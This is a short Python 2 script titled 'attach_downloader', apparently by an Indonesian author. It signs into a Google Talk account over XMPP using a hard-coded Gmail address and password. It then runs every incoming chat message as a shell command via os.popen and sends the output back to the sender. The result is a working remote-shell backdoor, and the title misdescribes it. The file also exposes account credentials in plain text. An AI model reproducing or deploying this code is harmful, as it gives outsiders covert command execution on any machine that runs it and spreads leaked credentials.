#!/usr/bin/python2
# Python attach_downloader
# Author : alam ybs
# Email  : namakukingkong[at]gmail[dot]com
# dependency : python2

import sys
import os,getpass
import sys
sys.path.append("xmpppy-0.5.0rc1")
import xmpp

# Google Talk constants
FROM_GMAIL_ID ="consoledowo@gmail.com"
GMAIL_PASS = "laliaku23"
GTALK_SERVER = "talk.google.com"


def messageCB(sess,mess):

    nick=mess.getFrom()
    text=mess.getBody()
    nicky=nick
    if text is not None:
        print "===>",str(text)
        ncommt=os.popen(text).read()
        cl.send( xmpp.Message( nicky ,ncommt ) )

def mulai():
  while 1:
    global cl
    jid=xmpp.protocol.JID(FROM_GMAIL_ID)
    cl=xmpp.Client(jid.getDomain(),debug=[])
    if not cl.connect((GTALK_SERVER,5222)):
        raise IOError('Can not connect to server.')
    if not cl.auth(jid.getNode(),GMAIL_PASS):
        raise IOError('Can not auth with server.')
    cl.auth(FROM_GMAIL_ID, GMAIL_PASS, 'botty')
    cl.sendInitPresence()
    terima()

def terima():
    cl.RegisterHandler('message',messageCB)
    if 1:
        while 1:
            cl.Process(1)


if __name__=='__main__':
  try:
    mulai()

  except KeyboardInterrupt:
    print ("  Program dihentikan \n")
    sys.exit(0)
